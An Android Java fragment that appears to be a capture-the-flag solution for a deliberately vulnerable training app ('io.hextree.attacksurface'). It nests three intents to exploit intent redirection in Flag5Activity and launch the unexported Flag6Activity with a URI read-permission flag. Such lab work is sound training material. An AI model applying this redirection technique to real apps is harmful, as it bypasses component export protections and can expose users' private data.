package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class Flag6Fragment extends Fragment {
    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag6, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag6);
        launchButton.setOnClickListener(v -> {
            // same code for flag5 except intent3 now opens the flag6 unexported activity.
            Intent intent1 = new Intent();
            Intent intent2 = new Intent();
            Intent intent3 = new Intent();
            intent1.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));
            intent2.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));
            intent3.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag6Activity"));
            intent3.putExtra("reason", "next");
            intent3.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            intent2.putExtra("nextIntent", intent3);
            intent2.putExtra("return", 42);
            intent1.putExtra("android.intent.extra.INTENT", intent2);
            startActivity(intent1);
        });
        return view;
    }
} 